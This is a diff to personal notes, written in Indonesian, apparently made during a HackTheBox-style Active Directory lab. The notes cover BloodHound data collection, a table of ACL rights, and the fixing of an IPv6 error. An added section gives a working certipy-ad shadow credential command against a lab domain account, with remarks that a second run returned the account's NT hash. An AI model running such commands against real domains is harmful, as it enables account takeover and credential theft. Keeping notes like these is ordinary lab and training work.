@@ -4,7 +4,7 @@ Kapan mulai pake bloodhound?
 
 dahulukan credential plaintext untuk generate bloodhound
 
-# 1. Mapping Serangan
+# Mapping Serangan
 ## Colect data
 dahulukan credential plaintext untuk generate bloodhound
 ```shell
@@ -35,6 +35,15 @@ apa yang bisa Akun ini kontrol.
 | Write Owner   | can change the owner of a group or modify the access control list (ACL) Management for the group |
 | Generic All   | Full Control                                                                                     |
 | Generic Write | Shadow Credential Attack                                                                         |
+
+# Shadow Credential Attack
+```shell
+certipy-ad shadow auto -u 'svc_recovery@logging.htb' -k -no-pass -dc-ip 10.129.245.130 -account 'msa_health$' -target DC01.logging.htb
+```
+ini belum dapat, generate lagi
+![](Attachments/Pasted%20image%2020260703183605.png)
+ini baru dapat NThash nya
+![](Attachments/Pasted%20image%2020260703184105.png)
 # Error
 ## deadbeef
 problem -> ipv6 active
